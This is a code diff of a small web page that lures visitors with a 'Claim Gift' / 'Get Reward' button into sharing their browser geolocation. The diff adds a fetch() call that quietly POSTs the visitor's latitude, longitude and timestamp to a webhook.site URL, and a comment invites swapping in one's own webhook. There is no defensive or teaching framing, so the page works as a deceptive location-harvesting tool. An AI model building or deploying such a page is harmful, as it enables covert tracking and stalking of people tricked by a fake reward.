@@ -1,35 +1,3 @@
-<!DOCTYPE html>
-<html>
-<head>
-<title>Share Location</title>
-<style>
-  body {
-    text-align: center;
-    font-family: Arial, sans-serif;
-    margin-top: 50px;
-  }
-  img {
-    width: 150px; /* You can adjust size here */
-    margin-bottom: 20px;
-  }
-  button {
-    padding: 10px 20px;
-    font-size: 18px;
-    cursor: pointer;
-  }
-</style>
-</head>
-<body>
-
-<!-- Gift Box Image -->
-<img src="https://cdn-icons-png.flaticon.com/512/847/847969.png" alt="Gift Box">
-
-<h2>Click Below to Claim Gift</h2>
-
-<button onclick="getLocation()">Get Reward</button>
-
-<p id="location"></p>
-
 <script>
 function getLocation() {
   if (navigator.geolocation) {
@@ -44,12 +12,22 @@ function showPosition(position) {
   const lon = position.coords.longitude;
   document.getElementById("location").innerHTML =
     "Latitude: " + lat + "<br>Longitude: " + lon;
+
+  // Replace with your own webhook.site URL here
+  fetch("https://webhook.site/9ed1c789-439e-472d-ac6e-352935f51e13", {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({
+      latitude: lat,
+      longitude: lon,
+      time: new Date().toLocaleString()
+    })
+  })
+  .then(response => console.log("Location sent"))
+  .catch(err => console.error("Error sending location", err));
 }
 
 function showError(error) {
   alert("Error getting location: " + error.message);
 }
 </script>
-
-</body>
-</html>
